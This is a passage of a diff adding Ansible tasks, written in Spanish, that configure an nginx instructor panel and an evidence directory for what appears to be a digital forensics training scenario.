+        group: instructor
+        mode: '0640'
+
+    - name: Configurar nginx para panel del instructor
+      ansible.builtin.copy:
+        content: |
+          server {
+              listen 8080;
+              server_name localhost;
+
+              location / {
+                  root /var/www/html;
+                  index index.html;
+              }
+
+              location /evidence/ {
+                  alias /evidence/;
+                  autoindex on;
+                  auth_basic "Area Restringida";
+                  auth_basic_user_file /etc/nginx/.htpasswd;
+              }
+          }
+        dest: /etc/nginx/sites-available/instructor
+        owner: root
+        group: root
+        mode: '0644'
+
+    - name: Habilitar sitio nginx
+      ansible.builtin.command: ln -sf /etc/nginx/sites-available/instructor /etc/nginx/sites-enabled/instructor
+      changed_when: false
+
+    - name: Crear pagina de inicio del instructor
+      ansible.builtin.copy:
+        content: |
+          <!DOCTYPE html>
+          <html>
+          <head><title>Instructor - Escenario 06</title></head>
+          <body>
+              <h1>Panel del Instructor - Escenario 06</h1>
+              <h2>Analisis Forense Digital</h2>
+              <ul>
+                  <li><a href="/evidence/">Evidencia Forense</a></li>
+                  <li><a href="/evidence/chain_of_custody/">Cadena de Custodia</a></li>
+                  <li><a href="/evidence/student_submissions/">Entregas de Alumnos</a></li>
+              </ul>
+              <hr>
+              <p>Banco del Sol - Escenario 06 - Tectonic BHU</p>
+          </body>
+          </html>
+        dest: /var/www/html/index.html
+        owner: root
+        group: root
+        mode: '0644'
+
+    - name: Reiniciar nginx
+      ansible.builtin.systemd:
+        name: nginx
+        state: restarted
+        enabled: yes
+
+    - name: Mensaje de finalizacion del instructor
+      ansible.builtin.debug:
+        msg: |
+          =============================================
+          Instructor VM configurada
+          - Evidencia en /evidence/
+          - Panel en http://10.10.0.10:8080
+          - NFS exportado a 10.10.0.20
+          - Scripts de verificacion listos
+          =============================================
